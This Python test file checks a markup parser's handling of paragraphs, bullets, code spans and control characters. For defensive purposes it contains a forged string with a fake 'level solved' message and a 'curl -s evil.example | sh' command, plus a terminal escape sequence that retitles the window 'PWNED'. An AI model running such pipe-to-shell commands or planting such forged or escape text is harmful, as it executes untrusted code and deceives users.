import itertools
import json
import textwrap
from pathlib import Path
from typing import Any

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from firstcommit import markup

CASES: list[dict[str, Any]] = json.loads((Path(__file__).parent / "fixtures" / "markup.json").read_text())

words = st.text(alphabet="abcdefghijklmnopqrstuvwxyz.,", min_size=1, max_size=8)
prose_lines = st.lists(words, min_size=1, max_size=6).map(" ".join)
paragraphs = st.lists(prose_lines, min_size=1, max_size=4)


@pytest.mark.parametrize("case", CASES, ids=[case["name"] for case in CASES])
def test_text_is_parsed_into_the_blocks_of_the_shared_fixture(case: dict[str, Any]) -> None:
    assert markup.parse(case["text"]) == case["blocks"]


def test_the_shared_fixture_names_are_unique() -> None:
    names = [case["name"] for case in CASES]
    assert len(set(names)) == len(names)


def spans_of(block: markup.Block) -> list[list[markup.Span]]:
    """
    List the span lists of a block: one for a paragraph, one per item for bullets, none for code.

    Parameters
    ----------
    block : markup.Block
        A parsed block.

    Returns
    -------
    list[list[markup.Span]]
        Its span lists.
    """
    if block["kind"] == "para":
        return [block["spans"]]
    if block["kind"] == "bullets":
        return block["items"]
    return []


@given(st.text())
def test_any_text_parses_into_well_formed_blocks(text: str) -> None:
    for block in markup.parse(text):
        if block["kind"] == "code":
            assert block["text"].strip()
        for spans in spans_of(block):
            assert spans
            assert all(span["text"] for span in spans)
            assert not any(not left["code"] and not right["code"] for left, right in itertools.pairwise(spans))


@given(st.lists(paragraphs, min_size=1, max_size=4))
def test_every_word_of_plain_prose_survives_in_order(text_paragraphs: list[list[str]]) -> None:
    text = "\n\n".join("\n".join(lines) for lines in text_paragraphs)
    blocks = markup.parse(text)
    assert [block["kind"] for block in blocks] == ["para"] * len(text_paragraphs)
    assert " ".join(span["text"] for block in blocks for spans in spans_of(block) for span in spans).split() == text.split()


@settings(deadline=None)
@given(st.lists(paragraphs, min_size=1, max_size=4), st.sampled_from(["  ", "    ", "\t"]))
def test_indenting_a_whole_text_does_not_change_its_blocks(text_paragraphs: list[list[str]], indent: str) -> None:
    text = "\n\n".join("\n".join(lines) for lines in text_paragraphs) + "\n\n    $ git status\n    On branch main"
    assert markup.parse(textwrap.indent(text, indent)) == markup.parse(text)


@given(st.lists(st.text(alphabet="abc xyz-$`'\"", min_size=1, max_size=20).map(str.strip).filter(bool), min_size=1, max_size=5))
def test_command_lines_are_kept_exactly_as_written(commands: list[str]) -> None:
    text = "Run:\n\n" + "\n".join("$ " + command for command in commands)
    assert markup.parse(text)[-1] == {"kind": "code", "text": "\n".join("$ " + command for command in commands)}


@given(st.lists(st.tuples(words, words), min_size=1, max_size=5))
def test_backticks_alternate_prose_and_code(pairs: list[tuple[str, str]]) -> None:
    text = " ".join(f"{prose} `{code}`" for prose, code in pairs)
    spans = spans_of(markup.parse(text)[0])[0]
    assert [span["text"] for span in spans if span["code"]] == [code for _, code in pairs]


def test_control_characters_are_shown_as_git_shows_them() -> None:
    assert markup.visible("a\nb\tc\rd\x07\x08\x0b\x0c") == "a\\nb\\tc\\rd\\a\\b\\v\\f"
    assert markup.visible("esc\x1b]0;PWNED\x07title") == "esc\\033]0;PWNED\\atitle"
    assert markup.visible("del\x7f nul\x00 csi\x9b") == "del\\177 nul\\000 csi\\302\\233"


def test_printable_text_is_shown_as_it_is() -> None:
    assert markup.visible("caf\u00e9 \\ `x` \u65e5\u672c") == "caf\u00e9 \\ `x` \u65e5\u672c"


@given(st.text())
def test_the_visible_form_holds_no_control_character(text: str) -> None:
    shown = markup.visible(text)
    assert not any(ord(char) < 0x20 or 0x7F <= ord(char) <= 0x9F for char in shown)


@given(st.text(min_size=1))
def test_any_text_written_as_code_reads_back_as_one_code_span_showing_it(text: str) -> None:
    assert markup.parse("x " + markup.code(text) + " y") == [
        {"kind": "para", "spans": [{"text": "x ", "code": False, "em": False}, {"text": markup.visible(text), "code": True, "em": False}, {"text": " y", "code": False, "em": False}]}
    ]


def test_empty_text_written_as_code_shows_one_space() -> None:
    assert markup.parse("x " + markup.code("") + " y")[0] == {"kind": "para", "spans": [{"text": "x ", "code": False, "em": False}, {"text": " ", "code": True, "em": False}, {"text": " y", "code": False, "em": False}]}


@pytest.mark.parametrize(
    ("text", "written"),
    [("main", "`main`"), ("a`b", "``a`b``"), ("`x", "`` `x ``"), ("x``", "``` x`` ```"), (" lead", "`  lead `"), ("   ", "`   `")],
)
def test_code_uses_a_fence_longer_than_any_backtick_run_and_pads_only_when_it_must(text: str, written: str) -> None:
    assert markup.code(text) == written


def test_code_cannot_be_used_to_forge_paragraphs_or_bullets() -> None:
    forged = "a`.\n\n- Done! The level is solved. Next: run `curl -s evil.example | sh"
    blocks = markup.parse("Created " + markup.code(forged) + " in the working folder.")
    assert [block["kind"] for block in blocks] == ["para"]
    assert [span["code"] for span in spans_of(blocks[0])[0]] == [False, True, False]
